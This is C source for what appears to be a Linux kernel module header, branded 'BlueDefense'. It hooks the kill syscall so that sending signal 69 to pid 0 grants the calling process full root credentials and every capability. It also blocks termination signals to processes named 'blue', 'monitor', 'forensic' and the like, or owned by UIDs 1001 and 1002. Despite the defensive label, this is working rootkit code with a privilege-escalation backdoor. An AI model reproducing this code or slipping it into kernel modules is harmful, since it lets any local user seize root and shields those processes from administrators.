#ifndef KILL_H
#define KILL_H

#include "../include/headers.h"

static asmlinkage long (*orig_kill)(const struct pt_regs *regs);
static int g_magic_signal = 69;

void set_magic_signal(int signal) {
    g_magic_signal = signal;
}

// Grant root privileges to current process
static void give_root(void) {
    struct cred *newcreds;
    
    newcreds = prepare_creds();
    if (newcreds == NULL)
        return;
    
    // Set all IDs to root
    newcreds->uid.val = newcreds->gid.val = 0;
    newcreds->euid.val = newcreds->egid.val = 0;
    newcreds->suid.val = newcreds->sgid.val = 0;
    newcreds->fsuid.val = newcreds->fsgid.val = 0;
    
    // Clear capability bounding set and add all capabilities
    cap_clear(newcreds->cap_bset);
    cap_set_full(newcreds->cap_effective);
    cap_set_full(newcreds->cap_inheritable);
    cap_set_full(newcreds->cap_permitted);
    
    commit_creds(newcreds);
}

// Hook for kill syscall - provides privilege escalation backdoor
static asmlinkage long hooked_kill(const struct pt_regs *regs) {
    pid_t pid = (pid_t)regs->di;
    int sig = (int)regs->si;
    
    // Check for magic signal combination
    if (sig == g_magic_signal && pid == 0) {
        printk(KERN_INFO "[BlueDefense] Magic signal %d detected - granting root privileges to PID %d\n", 
               g_magic_signal, current->pid);
        give_root();
        return 0; // Success - don't actually send signal
    }
    
    // Block certain dangerous signals to protect blue team processes
    if (sig == SIGKILL || sig == SIGTERM || sig == SIGSTOP) {
        struct task_struct *target_task;
        
        rcu_read_lock();
        target_task = pid_task(find_vpid(pid), PIDTYPE_PID);
        if (target_task) {
            // Protect processes with specific names
            if (strstr(target_task->comm, "blue") || 
                strstr(target_task->comm, "defense") ||
                strstr(target_task->comm, "monitor") ||
                strstr(target_task->comm, "forensic") ||
                strstr(target_task->comm, "incident")) {
                
                rcu_read_unlock();
                printk(KERN_INFO "[BlueDefense] Blocked attempt to kill protected process: %s (PID: %d)\n", 
                       target_task->comm, pid);
                return -EPERM; // Permission denied
            }
            
            // Protect processes owned by specific UIDs (blue team members)
            if (target_task->cred->uid.val == 1001 || // blueteam user
                target_task->cred->uid.val == 1002) { // forensic user
                rcu_read_unlock();
                printk(KERN_INFO "[BlueDefense] Blocked attempt to kill blue team process (UID: %d)\n", 
                       target_task->cred->uid.val);
                return -EPERM;
            }
        }
        rcu_read_unlock();
    }
    
    // Call original kill syscall for normal operations
    return orig_kill(regs);
}

#endif // KILL_H
